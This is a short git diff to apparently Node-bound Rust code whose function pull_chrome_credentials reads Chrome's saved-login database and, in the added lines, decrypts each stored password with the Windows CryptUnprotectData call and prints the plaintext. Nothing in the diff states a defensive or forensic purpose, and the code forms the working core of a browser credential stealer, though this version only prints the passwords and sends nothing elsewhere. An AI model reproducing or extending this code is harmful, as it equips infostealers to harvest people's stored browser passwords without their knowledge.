@@ -6,6 +6,8 @@ use dirs::home_dir;
 
 use rusqlite::{Connection, OpenFlags, Result};
 
+use crate::cryptos::win::bindings::Windows::Win32::Security::CryptUnprotectData;
+use crate::cryptos::win::bindings::Windows::Win32::Security::Cryptography::Core::CRYPTOAPI_BLOB;
 use crate::error::{ExtractorResult, ExtractorError};
 
 pub fn stub(mut cx: FunctionContext) -> JsResult<JsUndefined> {
@@ -30,6 +32,32 @@ pub fn pull_chrome_credentials() -> ExtractorResult<()> {
 
     while let Some(row) = res.next()? {
         let s: Vec<u8> = row.get(2)?;
+
+        let mut blob_data = CRYPTOAPI_BLOB {
+            cbData: s.len() as u32,
+            pbData: s.as_ptr() as *mut u8,
+        };
+
+        unsafe {
+            let mut output = CRYPTOAPI_BLOB::default();
+
+            CryptUnprotectData(
+                &mut blob_data,
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                0,
+                &mut output,
+            );
+
+            let password: Vec<u8> = std::slice::from_raw_parts(output.pbData, output.cbData as usize)
+                .iter()
+                .cloned()
+                .collect();
+
+            println!("{:?}", std::str::from_utf8(&password).unwrap());
+        }
 
         println!("data: {:?}", s);
     }
